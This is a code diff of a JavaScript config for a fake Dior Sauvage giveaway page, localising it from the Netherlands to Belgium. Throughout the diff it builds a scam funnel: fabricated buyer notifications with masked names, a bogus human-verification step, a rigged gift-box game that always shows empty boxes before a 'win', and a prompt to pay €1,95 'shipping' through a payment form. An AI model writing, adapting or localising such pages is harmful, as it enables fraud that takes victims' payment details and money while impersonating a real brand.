@@ -1,10 +1,10 @@
 const orderHref = window.__order_href;
 const orderOriginParam = window.__origin_param;
-const siteKey = "sauvage-fr";
+const siteKey = "sauvage-br";
 
 (function (exp) {
-  const countryCode = "nl";
-  const lang = "nl-NL";
+  const countryCode = "be";
+  const lang = "nl-BE";
   const locale = lang;
 
   const sizes = {
@@ -16,7 +16,7 @@ const siteKey = "sauvage-fr";
   // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "Gefeliciteerd! <br><br> U kunt deelnemen aan de promotie van Dior Sauvage 100 ml!",
+    name: "Proficiat! <br><br> U kunt deelnemen aan de promotie van Dior Sauvage 100 ml!",
     oldPrice: "",
     newPrice: "",
     selectText: "",
@@ -27,14 +27,14 @@ const siteKey = "sauvage-fr";
   const notifications = [
     {
       user: "Bea V***",
-      location: "Amsterdam, Nederland",
-      action: "Heeft net Dior Sauvage 100ml gekocht voor €1,95!",
+      location: "Brussel, België",
+      action: "Heeft net Dior Sauvage 100ml gekocht voor 1,95 €!",
       timeago: "15 seconden geleden",
     },
     {
       user: "Tessa B***",
-      location: "Rotterdam, Nederland",
-      action: "Heeft net Dior Sauvage 100ml gekocht voor €1,95!",
+      location: "Antwerpen, België",
+      action: "Heeft net Dior Sauvage 100ml gekocht voor 1,95 €!",
       timeago: "25 seconden geleden",
     },
   ];
@@ -122,14 +122,14 @@ const siteKey = "sauvage-fr";
         header: "Gefeliciteerd, u heeft succesvol geverifieerd dat u een echt persoon bent.",
         button: "OK",
         text: `
-      <center>
-      Vandaag, {date}, heeft u de kans om uw Dior Sauvage 100ml te ontvangen.
-        <br><br>
-        U hoeft alleen maar het juiste cadeaupakket te kiezen.
-        <br><br>
-        U heeft 3 opties, veel succes!
-      </center>
-    `,
+        <center>
+        Vandaag, {date}, heeft u de kans om uw Dior Sauvage 100ml te ontvangen.
+          <br><br>
+          U hoeft alleen maar het juiste cadeaupakket te kiezen.
+          <br><br>
+          U heeft 3 opties, veel succes!
+        </center>
+      `,
       },
     },
     first: {
@@ -137,10 +137,10 @@ const siteKey = "sauvage-fr";
         header: "Oh nee...",
         button: "OK",
         text: `
-      <center>
-      Sorry, maar dit cadeau is leeg. U heeft nog 2 pogingen over. Veel succes!
-      </center>
-    `,
+        <center>
+        Sorry, maar dit cadeau is leeg. U heeft nog 2 pogingen over. Veel succes!
+        </center>
+      `,
       },
     },
     win: {
@@ -148,18 +148,18 @@ const siteKey = "sauvage-fr";
         header: `Gefeliciteerd! U heeft gewonnen!`,
         button: "OK",
         text: `
-      <center>
-        <p style="color: #b51817">
-        U heeft Dior Sauvage 100ml gewonnen!
-        </p>
-        <br>
-        1) Klik op "OK" hieronder om naar de pagina voor verzendbetaling te gaan.
-         <br><br>
-        2) Vul het formulier in en betaal uw bestelling om Dior Sauvage te ontvangen.
-        <br><br>
-        3) Het pakket wordt binnen 5 tot 7 dagen bezorgd.
-      </center>
-    `,
+        <center>
+          <p style="color: #b51817">
+          U heeft Dior Sauvage 100ml gewonnen!
+          </p>
+          <br>
+          1) Klik op "OK" hieronder om naar de pagina voor verzendbetaling te gaan.
+           <br><br>
+          2) Vul het formulier in en betaal uw bestelling om Dior Sauvage te ontvangen.
+          <br><br>
+          3) Het pakket wordt binnen 5 tot 7 dagen bezorgd.
+        </center>
+      `,
       },
     },
   };
@@ -241,11 +241,11 @@ const siteKey = "sauvage-fr";
     main: {
       title: "Bestellingsoverzicht",
       oldPrice: "",
-      newPrice: "€1,95",
+      newPrice: "1,95 €",
       size: "Maat",
       subTotal: {
         title: "Bestellingswaarde",
-        amount: "€1,95",
+        amount: "1,95 €",
       },
       delivery: {
         title: "Bezorging",
@@ -253,7 +253,7 @@ const siteKey = "sauvage-fr";
       },
       total: {
         title: "Totaal",
-        amount: "€1,95",
+        amount: "1,95 €",
       },
       checkoutButton: "Betaal uw bestelling",
     },
@@ -266,10 +266,7 @@ const siteKey = "sauvage-fr";
       miniImg: "./assets/slide_1.png",
 
       images: [
-        // "./assets/slide_1.png",
-        // "./assets/slide_2.png",
         "./assets/slide_3.jpg",
-        // "./assets/slide_4.jpg",
       ],
     },
   ];
@@ -277,6 +274,7 @@ const siteKey = "sauvage-fr";
   const footer = {
     cr: "© 2024 DIOR. Alle rechten voorbehouden.",
   };
+
 
 
 
@@ -330,7 +328,7 @@ window.addEventListener("load", () => {
   timerInit();
 });
 
-function setCookie(name, value, days = 30) {
+function setCookie(name, value, days = 2) {
   const expires = new Date(Date.now() + days * 864e5).toUTCString();
   document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
 }
